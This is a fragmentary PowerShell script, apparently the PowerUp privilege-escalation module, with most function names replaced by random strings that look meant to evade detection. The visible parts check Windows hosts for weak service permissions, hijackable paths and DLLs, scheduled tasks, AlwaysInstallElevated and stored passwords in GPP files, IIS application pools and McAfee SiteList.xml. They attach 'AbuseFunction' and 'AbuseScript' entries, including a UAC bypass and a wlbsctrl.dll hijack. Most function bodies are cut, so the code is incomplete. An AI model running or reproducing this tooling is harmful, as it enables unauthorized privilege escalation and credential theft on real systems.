...
function FEILFIR1 {
    ...
    PROCESS {
        ...
        if ($ProcessHandle) {
            ...
            if ($Success) {
                $TokenGroups = IETA2FXZ -TokenHandle $hProcToken -InformationClass 'Groups'
...
function YO3ROV4U {
    ...
    PROCESS {
        ...
        if ($ProcessHandle) {
            ...
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($Success) {
                IETA2FXZ -TokenHandle $hProcToken -InformationClass 'Privileges' | ForEach-Object {
...
function 9MOW3MG3 {
    ...
    PROCESS {
        ...
        if ($ProcessHandle) {
            ...
            if ($Success) {
                $TokenType = IETA2FXZ -TokenHandle $hProcToken -InformationClass 'Type'
...
function 4QL910W8 {
    ...
    PROCESS {
        ForEach($ServiceName in $Name) {
            ...
            try {
                Write-Verbose "4QL910W8 IndividualService : $($IndividualService.Name)"
...
function U895VUG7 {
    ...
    PROCESS {
        ...
        ForEach($IndividualService in $Name) {
            ...
            $TargetService = $IndividualService | 4QL910W8
...
function 81U4RK6G {
    ...
    if ($VulnServices) {
        ForEach ($Service in $VulnServices) {
            ...
            $ModifiableFiles = $ConcatPathArray | LQ1XKCO7

            $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                $CanRestart = U895VUG7 -PermissionSet 'Restart' -Name $Service.name
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                $Out | Add-Member Noteproperty 'Path' $Service.pathname
                $Out | Add-Member Noteproperty 'ModifiablePath' $_
                $Out | Add-Member Noteproperty 'StartName' $Service.startname
                $Out | Add-Member Noteproperty 'AbuseFunction' "AG9Q6TYQ -Name '$($Service.name)' -Path <HijackPath>"
...
function UGW1JKYG {
    ...
    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {
        ...
        $ServicePath | LQ1XKCO7 | ForEach-Object {
            $CanRestart = U895VUG7 -PermissionSet 'Restart' -Name $ServiceName
            $Out = New-Object PSObject
            ...
            $Out | Add-Member Noteproperty 'AbuseFunction' "TDN3Z3LZ -Name '$ServiceName'"
            $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
            $Out | Add-Member Aliasproperty Name ServiceName
...
function YEXSFL4L {
    ...
    Get-Service | U895VUG7 -PermissionSet 'ChangeConfig' | ForEach-Object {
        $ServiceDetails = $_ | DEIUUK4U
        $CanRestart = $_ | U895VUG7 -PermissionSet 'Restart'
        $Out = New-Object PSObject
        ...
        $Out | Add-Member Noteproperty 'AbuseFunction' "IM9FXHK2 -Name '$($ServiceDetails.name)'"
        $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
        $Out | Add-Member Aliasproperty Name ServiceName
...
function IM9FXHK2 {
    ...
    PROCESS {
        ...
        ForEach($IndividualService in $Name) {
            ...
            $TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
            $ServiceDetails = $TargetService | DEIUUK4U
            ...
            ForEach($ServiceCommand in $ServiceCommands) {
                ...
                $Success = $TargetService | O0J4UI3X -Path "$ServiceCommand"
            ...
            $Success = $TargetService | O0J4UI3X -Path "$OriginalServicePath"
...
function TDN3Z3LZ {
    ...
    PROCESS {
        ...
        $ServiceDetails = $TargetService | DEIUUK4U
        $ModifiableFiles = $ServiceDetails.PathName | LQ1XKCO7 -Literal
        ...
        $Result = AG9Q6TYQ -Name $ServiceDetails.Name -Command $ServiceCommand -Path $ServicePath
...
function 7MKEQSFQ {
    ...
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        $TargetPath = $_
        $ModifidablePaths = $TargetPath | LQ1XKCO7 -Literal | Where-Object {$_ -and ($Null -ne $_) -and ($Null -ne $_.ModifiablePath) -and ($_.ModifiablePath.Trim() -ne '')}
    ...
    Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        try {
            ...
            if ($TaskXML.Task.Triggers) {
                ...
                $TaskXML.Task.Actions.Exec.Command | LQ1XKCO7 | ForEach-Object {
                    $Out = New-Object PSObject
                ...
                $TaskXML.Task.Actions.Exec.Arguments | LQ1XKCO7 | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
...
function TNZ1BO0U {
    ...
    Write-Verbose "Running TNZ1BO0U"
    ...
    $Checks = @(
        ...
        @{
            ...
            Command     = { if ((FEILFIR1 | Select-Object -ExpandProperty SID) -contains 'S-1-5-32-544'){ New-Object PSObject } }
            AbuseScript = { 'Invoke-WScriptUACBypass -Command "..."' }
        },
        @{
            Type       = 'Process Token Privileges'
            Command    = { YO3ROV4U -Special | Where-Object {$_} }
        },
        ...
        @{
            ...
            Command     = { 7MKEQSFQ }
            AbuseScript = { "9L67ZKCR -DllPath '$($_.ModifiablePath)\wlbsctrl.dll'" }
        },
        
        @{
            Type        = 'AlwaysInstallElevated Registry Key'
            Command     = { if (OYTV2VIH){ New-Object PSObject } }
            AbuseScript = { 'RVNSLS50' }
        },
        @{
        ...
        @{
            ...
            Command = { PWLWHLP2 | Where-Object {$_} }
        },
        @{
            Type    = 'Encrypted Application Pool Passwords'
            Command = { 39CDTO28 | Where-Object {$_} }
        },
        @{
            Type    = 'McAfee SiteList.xml files'
            Command = { D3SLL4OR | Where-Object {$_} }
        },
        @{
            Type    = 'Cached GPP Files'
            Command = { V1EJAG92 | Where-Object {$_} }
        }
    )
...
$Module = GGX4BOQS -ModuleName PowerUpModule
...
Set-Alias Get-CurrentUserTokenGroupSid FEILFIR1
Set-Alias Invoke-AllChecks TNZ1BO0U
